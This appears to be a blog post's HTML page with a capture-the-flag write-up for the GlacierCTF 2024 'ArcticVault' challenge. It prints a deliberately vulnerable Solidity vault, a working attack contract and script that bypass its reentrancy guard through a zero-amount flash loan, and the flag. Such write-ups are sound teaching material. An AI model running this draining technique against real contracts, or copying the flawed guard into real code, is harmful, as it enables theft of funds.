@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>ArcticVault - GlacierCTF 2024 | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="ArcticVault - GlacierCTF 2024" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://ctftime.org/event/2402" />
+<meta property="og:description" content="https://ctftime.org/event/2402" />
+<link rel="canonical" href="https://shafouz.github.io/2024/11/24/ArcticVault.html" />
+<meta property="og:url" content="https://shafouz.github.io/2024/11/24/ArcticVault.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-11-24T04:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ArcticVault - GlacierCTF 2024" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2024-11-24T04:00:00+00:00","datePublished":"2024-11-24T04:00:00+00:00","description":"https://ctftime.org/event/2402","headline":"ArcticVault - GlacierCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2024/11/24/ArcticVault.html"},"url":"https://shafouz.github.io/2024/11/24/ArcticVault.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">ArcticVault - GlacierCTF 2024</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-11-24T04:00:00+00:00" itemprop="datePublished">
+        Nov 24, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>https://ctftime.org/event/2402</p>
+
+<h1 id="arcticvault-blockchain">ArcticVault (blockchain)</h1>
+
+<p>Reentrancy challenge</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>The challenge is a simple vault contract. And you objective is drain it.
+The contract has a reentrancy guard on most of the functions. Except <code class="language-plaintext highlighter-rouge">flashLoan</code>.
+It also starts with <code class="language-plaintext highlighter-rouge">reentrancyGuard = false</code>.
+The bug is that flashLoan accepts loans for zero. 
+And that allows you to bypass the guard by just calling flashLoan(0).</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Setup</span> <span class="p">{</span>
+    <span class="n">ArcticVault</span> <span class="k">public</span> <span class="kr">immutable</span> <span class="n">TARGET</span><span class="p">;</span> <span class="c1">// Contract the player will hack
+</span>
+    <span class="k">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+
+        <span class="c1">// Deploy the victim contract
+</span>        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArcticVault</span><span class="p">();</span>
+
+        <span class="n">TARGET</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Our challenge in the CTF framework will call this function to
+</span>    <span class="c1">// check whether the player has solved the challenge or not.
+</span>    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// --------------- ArcticVault.sol ---------------
+// The first artic vault, even safer than swiss banking ;)
+// Deposit your funds, and the tax collector will never find them.
+// We even offer the coldest flash loans in the world!
+</span>
+<span class="k">contract</span> <span class="n">ArcticVault</span>
+<span class="p">{</span>
+    <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
+    <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">paused</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="k">public</span> <span class="n">reentrancyGuard</span><span class="p">;</span>
+
+    <span class="k">modifier</span> <span class="n">notPaused</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">paused</span><span class="p">,</span> <span class="s">"Contract is paused"</span><span class="p">);</span>
+        <span class="n">_</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">event</span> <span class="n">Donation</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">);</span>
+
+    <span class="k">event</span> <span class="n">MyEvent</span><span class="p">(</span><span class="kt">bytes</span> <span class="n">data</span><span class="p">);</span>
+
+    <span class="k">constructor</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Users can deposit funds into the contract
+</span>    <span class="k">function</span> <span class="n">deposit</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Amount must be greater than 0"</span><span class="p">);</span>
+
+        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Donate to the glacier
+</span>    <span class="k">function</span> <span class="n">donate</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Amount must be greater than 0"</span><span class="p">);</span>
+
+        <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+        
+        <span class="k">emit</span> <span class="n">Donation</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Users can withdraw funds from the vault
+</span>    <span class="k">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"You have no funds to withdraw"</span><span class="p">);</span>
+
+        <span class="kt">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">];</span>
+        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+        <span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Pause contract (in case the glacier gets infiltrated)
+</span>    <span class="k">function</span> <span class="n">pause</span><span class="p">()</span> <span class="k">public</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">"You are not the owner of this contract"</span><span class="p">);</span>
+        <span class="n">paused</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Unpause contract (in case the glacier gets cleared)
+</span>    <span class="k">function</span> <span class="n">unpause</span><span class="p">()</span> <span class="k">public</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">"You are not the owner of this contract"</span><span class="p">);</span>
+        <span class="n">paused</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">flashLoan</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">"Owner has insufficient funds"</span><span class="p">);</span>
+
+        <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+
+        <span class="c1">//Do the flash loan
+</span>        <span class="n">reentrancyGuard</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">amount</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+        <span class="n">reentrancyGuard</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+        <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="n">balanceBefore</span><span class="p">,</span> <span class="s">"Flash loan failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// ------------------ Utils to make your life easier ------------------
+</span>
+
+    <span class="c1">//Multicall for other contracts (saves gas)
+</span>    <span class="k">function</span> <span class="n">multicallOthers</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_targets</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> 
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">_targets</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="n">_data</span><span class="p">.</span><span class="n">length</span><span class="p">,</span> <span class="s">"Arrays must be the same length"</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_targets</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_targets</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nb">call</span><span class="p">(</span><span class="n">_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Transaction failed"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Multicall for this contract (saves gas)
+</span>    <span class="k">function</span> <span class="n">multicallThis</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_data</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Transaction failed"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Carve your personalized event into the ice
+</span>    <span class="k">function</span> <span class="n">emitEvent</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+
+        <span class="k">emit</span> <span class="n">MyEvent</span><span class="p">(</span><span class="n">_data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">import</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"forge-std/console.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Atk</span> <span class="p">{</span>
+  <span class="n">ArcticVault</span> <span class="n">av</span><span class="p">;</span>
+  <span class="kt">bool</span> <span class="n">toggle</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+  <span class="k">function</span> <span class="n">run</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="n">av</span> <span class="o">=</span> <span class="n">ArcticVault</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">toggle</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+    <span class="n">toggle</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">0</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Hax</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+    <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">"PRIVATE_KEY"</span><span class="p">));</span>
+    <span class="n">Setup</span> <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xcC29E0ba11fA7fcBF65F58E7A59a46C1a3cBfEd3</span><span class="p">));</span>
+    <span class="n">ArcticVault</span> <span class="n">chall</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">TARGET</span><span class="p">();</span>
+
+    <span class="n">Atk</span> <span class="n">atk</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Atk</span><span class="p">();</span>
+    <span class="n">atk</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">chall</span><span class="p">));</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">gctf{Me55age_d0t_wh4t?}</code></p>
+
+<p>shafouz 2024/11/24</p>
+
+  </div><a class="u-url" href="/2024/11/24/ArcticVault.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
